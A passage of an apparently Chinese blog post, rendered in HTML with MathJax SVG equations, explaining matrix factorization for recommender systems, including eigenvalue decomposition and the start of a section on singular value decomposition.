64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="TeXAtom" transform="translate(583, -247) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(451, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1229, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -823.2 1 1146.5"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-2" transform="translate(0, -68.5)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>其中，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.735ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 767 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g></svg></mjx-container></span>表示用户对隐含特征的偏好矩阵，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.74ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 769 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container></span>表示物品对隐含特征的归属矩阵。</p>
<figure>
<img src="/bccd/mfcf.png" alt="User-item"><figcaption aria-hidden="true">User-item</figcaption>
</figure>
<p>通常，用户数量可能大于几千甚至几万几十万，而电商物品、电影书籍或文章的数量也通常高于几千。一个用户通常会浏览或评论几个物品，此时的评分矩阵是一个维度很大的稀疏矩阵，这时需要用到降维等方法进行计算。（这里将维度简单的视为矩阵的秩）矩阵分解（Matrix Factorization）是一类常用的降维方法，包括经典的特征值、奇异值分解，以及对于奇异值分解的多种改进方法，以及新的非负矩阵分解和概率矩阵分解等新算法。</p>
<p>最简单的矩阵分解是特征值分解，将方阵<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>分解为</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 24.45ex"><svg style="vertical-align: -0.717ex; min-width: 24.45ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="2.565ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -817)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 817) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="3325.4 -817 1 1133.9"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, -67)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="TeXAtom" transform="translate(750, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(600, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1378, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2476.4, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(3532.2, 0)"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="mi" transform="translate(4323.2, 0)"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="msup" transform="translate(4906.2, 0)"><g data-mml-node="mi"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="TeXAtom" transform="translate(791, 413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -817 1 1133.9"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-3" transform="translate(0, -67)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>只要取对角矩阵<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.027ex" xmlns="http://www.w3.org/2000/svg" width="1.319ex" height="1.597ex" role="img" focusable="false" viewBox="0 -694 583 706"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g></g></g></svg></mjx-container></span>的前k大的k个特征值，舍弃其他特征值，得到维度为k的近似矩阵<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="2.25ex" height="1.717ex" role="img" focusable="false" viewBox="0 -759 994.5 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g></g></g></svg></mjx-container></span>，维度就降为了k。但是实际的数据几乎没有方阵，此时就要用到特征值分解等其他方法。</p>
<h2 id="奇异值分解">奇异值分解</h2>
<p>计算奇异值分解的时间复杂度为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.531ex" height="2.451ex" role="img" focusable="false" viewBox="0 -833.2 2886.8 1083.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152, 0)"><g data-mml-node="mi"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mn" transform="translate(942.3, 363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(2497.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>，不过通常稀疏矩阵的计算中，计算量会远小于<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.531ex" height="2.451ex" role="img" focusable="false" viewBox="0 -833.2 2886.8 1083.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152, 0)"><g data-mml-node="mi"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mn" transform="translate(942.3, 363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(2497.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span></p>
<p>评分矩阵<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="5.419ex" height="1.977ex" role="img" focusable="false" viewBox="0 -716 2395.2 873.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="TeXAtom" transform="translate(750, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg></mjx-container></span>可以分解为</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 32.108ex"><svg style="vertical-align: -0.743ex; min-width: 32.108ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="2.618ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -828.6)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 828.6) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="5017.9 -828.6 1 1157.2"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, -63.1)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 